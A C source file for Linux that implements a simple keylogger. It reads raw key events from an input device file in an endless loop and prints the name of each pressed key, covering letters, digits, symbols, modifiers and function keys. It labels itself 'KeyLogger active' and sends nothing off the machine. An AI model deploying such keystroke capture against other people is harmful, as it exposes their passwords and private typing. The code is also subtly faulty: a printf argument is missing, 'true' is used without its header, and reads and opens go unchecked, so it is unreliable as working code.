#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <linux/input.h>
#include <unistd.h>
#include <linux/input-event-codes.h>

const char* key_name(unsigned int code) {
    switch (code) {
        /* Letters */
        case KEY_A: return "A";
        case KEY_B: return "B";
        case KEY_C: return "C";
        case KEY_D: return "D";
        case KEY_E: return "E";
        case KEY_F: return "F";
        case KEY_G: return "G";
        case KEY_H: return "H";
        case KEY_I: return "I";
        case KEY_J: return "J";
        case KEY_K: return "K";
        case KEY_L: return "L";
        case KEY_M: return "M";
        case KEY_N: return "N";
        case KEY_O: return "O";
        case KEY_P: return "P";
        case KEY_Q: return "Q";
        case KEY_R: return "R";
        case KEY_S: return "S";
        case KEY_T: return "T";
        case KEY_U: return "U";
        case KEY_V: return "V";
        case KEY_W: return "W";
        case KEY_X: return "X";
        case KEY_Y: return "Y";
        case KEY_Z: return "Z";

        /* Numbers (top row) */
        case KEY_1: return "1";
        case KEY_2: return "2";
        case KEY_3: return "3";
        case KEY_4: return "4";
        case KEY_5: return "5";
        case KEY_6: return "6";
        case KEY_7: return "7";
        case KEY_8: return "8";
        case KEY_9: return "9";
        case KEY_0: return "0";

        /* Symbols */
        case KEY_COMMA: return ",";
        case KEY_DOT: return ".";
        case KEY_SLASH: return "/";
        case KEY_SEMICOLON: return ";";
        case KEY_APOSTROPHE: return "'";
        case KEY_LEFTBRACE: return "[";
        case KEY_RIGHTBRACE: return "]";
        case KEY_MINUS: return "-";
        case KEY_EQUAL: return "=";
        case KEY_BACKSLASH: return "\\";

        /* Whitespace / control */
        case KEY_SPACE: return "SPACE";
        case KEY_ENTER: return "ENTER";
        case KEY_TAB: return "TAB";
        case KEY_BACKSPACE: return "BACKSPACE";
        case KEY_ESC: return "ESC";

        /* Modifiers */
        case KEY_LEFTSHIFT: return "LEFTSHIFT";
        case KEY_RIGHTSHIFT: return "RIGHTSHIFT";
        case KEY_LEFTCTRL: return "LEFTCTRL";
        case KEY_RIGHTCTRL: return "RIGHTCTRL";
        case KEY_LEFTALT: return "LEFTALT";
        case KEY_RIGHTALT: return "RIGHTALT";
        case KEY_LEFTMETA: return "LEFTSUPER";
        case KEY_RIGHTMETA: return "RIGHTSUPER";

        /* Function keys */
        case KEY_F1: return "F1";
        case KEY_F2: return "F2";
        case KEY_F3: return "F3";
        case KEY_F4: return "F4";
        case KEY_F5: return "F5";
        case KEY_F6: return "F6";
        case KEY_F7: return "F7";
        case KEY_F8: return "F8";
        case KEY_F9: return "F9";
        case KEY_F10: return "F10";
        case KEY_F11: return "F11";
        case KEY_F12: return "F12";

        default: return NULL;
    }
}

int main(int argc, char *argv[]) {
  if(argc != 2) {
    printf("Usage: %s <event-file>\n");
    exit(EXIT_FAILURE);
  }

  printf("KeyLogger active\n");

  int fd = open(argv[1], O_RDONLY, 0);

  struct input_event ie;

  while (true) {
    read(fd, &ie, sizeof(ie));
    if(ie.type == EV_KEY && ie.value == 1) {
      printf("Key Pressed: %s\n", key_name(ie.code));
    }
  }

  return EXIT_SUCCESS;
}

